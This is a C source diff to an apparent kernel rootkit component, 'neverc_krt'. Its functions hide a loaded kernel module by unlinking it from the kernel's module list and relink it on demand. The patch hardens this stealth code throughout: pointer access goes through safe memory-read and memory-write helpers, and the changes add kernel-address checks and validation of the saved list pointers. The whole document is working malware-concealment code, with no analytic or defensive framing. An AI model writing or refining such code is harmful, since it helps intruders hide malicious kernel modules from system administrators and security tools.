@@ -26,13 +26,22 @@ int neverc_krt_hide_init(void)
 void neverc_krt_mod_hide(struct neverc_krt_hide_state *state,
 			 struct neverc_krt_this_module *mod)
 {
-	struct list_head *our, *n, *p;
+	struct list_head *our;
+	unsigned long n_raw, p_raw;
 
 	if (state->hidden) return;
 
 	our = _neverc_krt_get_mod_list(mod);
-	n = our->next;
-	p = our->prev;
+	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
+	    neverc_krt_mem_read(&p_raw, &our->prev, 8))
+		return;
+
+	struct list_head *n = (struct list_head *)n_raw;
+	struct list_head *p = (struct list_head *)p_raw;
+
+	if ((unsigned long)n < 0xFFFF000000000000UL ||
+	    (unsigned long)p < 0xFFFF000000000000UL)
+		return;
 
 	state->saved_next = n;
 	state->saved_prev = p;
@@ -40,8 +49,8 @@ void neverc_krt_mod_hide(struct neverc_krt_hide_state *state,
 	if (_neverc_krt_hide_mutex_lock && _neverc_krt_module_mutex)
 		_neverc_krt_hide_mutex_lock(_neverc_krt_module_mutex);
 
-	p->next = n;
-	n->prev = p;
+	neverc_krt_mem_write(&p->next, &n, 8);
+	neverc_krt_mem_write(&n->prev, &p, 8);
 	our->next = our;
 	our->prev = our;
 
@@ -69,12 +78,26 @@ void neverc_krt_mod_show(struct neverc_krt_hide_state *state,
 	if (_neverc_krt_hide_mutex_lock && _neverc_krt_module_mutex)
 		_neverc_krt_hide_mutex_lock(_neverc_krt_module_mutex);
 
-	if (state->saved_prev->next == state->saved_next &&
-	    state->saved_next->prev == state->saved_prev) {
+	/*
+	 * Validate the saved pointers via mem_read before dereferencing:
+	 * if an adjacent module was unloaded between hide/show (even
+	 * though module_mutex prevents concurrent unload, being
+	 * defensive costs nothing on the unhide path).
+	 */
+	struct list_head prev_copy, next_copy;
+	if (neverc_krt_mem_read(&prev_copy, state->saved_prev, 16) ||
+	    neverc_krt_mem_read(&next_copy, state->saved_next, 16)) {
+		if (_neverc_krt_hide_mutex_unlock && _neverc_krt_module_mutex)
+			_neverc_krt_hide_mutex_unlock(_neverc_krt_module_mutex);
+		return;
+	}
+
+	if (prev_copy.next == state->saved_next &&
+	    next_copy.prev == state->saved_prev) {
 		our->next = state->saved_next;
 		our->prev = state->saved_prev;
-		state->saved_prev->next = our;
-		state->saved_next->prev = our;
+		neverc_krt_mem_write(&state->saved_prev->next, &our, 8);
+		neverc_krt_mem_write(&state->saved_next->prev, &our, 8);
 	}
 
 	if (_neverc_krt_hide_mutex_unlock && _neverc_krt_module_mutex)
